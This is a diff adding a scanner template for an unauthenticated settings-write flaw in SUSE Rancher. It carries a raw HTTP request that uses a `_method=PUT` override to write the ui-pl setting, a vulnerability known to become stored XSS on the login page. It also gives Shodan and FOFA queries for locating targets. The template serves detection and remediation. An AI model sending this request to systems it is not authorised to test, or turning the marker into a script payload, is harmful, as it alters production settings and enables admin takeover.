@@ -1,0 +1,76 @@
+id: vt-2026-88804
+
+info:
+  name: SUSE Rancher < 2.11.18 - Unauthenticated Public Settings Write (stored XSS primitive)
+  author: R0gfall
+  severity: critical
+  description: |
+    Rancher honours an HTTP method override via the `_method` query parameter on the
+    unauthenticated public settings routes (/v3/settings/*). These routes are meant to be
+    read-only, but the override lets an unauthenticated remote user turn a GET into a PUT and
+    write arbitrary setting values. The `value` of the "ui-pl" setting is later rendered
+    unescaped on the Rancher login/first-login page, so an attacker-controlled value becomes
+    stored cross-site scripting that runs for any user who opens the login page. This template
+    confirms the write primitive by setting ui-pl to a random marker and reading it back
+    (no XSS payload is delivered).
+  impact: |
+    An unauthenticated attacker can write arbitrary Rancher system settings and plant stored
+    XSS on the login page, leading to disclosure of the local admin bootstrap password or
+    hijacking of an admin session, and from there full administrative control of Rancher and
+    its downstream clusters.
+  remediation: |
+    Update Rancher to 2.15.2, 2.14.6, 2.13.10, 2.12.14, 2.11.18 or newer. Until then, put a
+    reverse proxy or WAF in front that rejects /v3/settings/* requests carrying method-override
+    parameters or bodies, and review ui-pl/ui-banners/ui-brand/ui-issues/ui-default-landing/
+    first-login for unexpected values.
+  reference:
+    - https://vulnerabletarget.com/VT-2026-88804
+    - https://github.com/R0gfall/CVE-2026-88804
+    - https://github.com/rancher/rancher/security/advisories/GHSA-992f-xh8r-jg2f
+    - https://nvd.nist.gov/vuln/detail/CVE-2026-88804
+    - https://www.cve.org/CVERecord?id=CVE-2026-88804
+  classification:
+    cvss-metrics: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H
+    cvss-score: 9.4
+    cve-id: CVE-2026-88804
+    cwe-id: CWE-79
+  metadata:
+    verified: true
+    max-request: 1
+    vendor: suse
+    product: rancher
+    shodan-query: http.title:"Rancher"
+    fofa-query: title="Rancher"
+  tags: cve,cve2026,rancher,suse,xss,auth-bypass,unauth,intrusive
+
+variables:
+  boundary: "{{rand_text_alphanumeric(16)}}"
+  marker: "{{rand_text_alphanumeric(12)}}"
+
+http:
+  - raw:
+      - |
+        GET /v3/settings/ui-pl?_method=PUT HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: curl/8.7.1
+        Accept: application/json
+        Content-Type: multipart/form-data; boundary=----{{boundary}}
+
+        ------{{boundary}}
+        Content-Disposition: form-data; name="value"
+
+        {{marker}}
+        ------{{boundary}}--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"id":"ui-pl"'
+          - '"value":"{{marker}}"'
+        condition: and
+
+      - type: status
+        status:
+          - 200
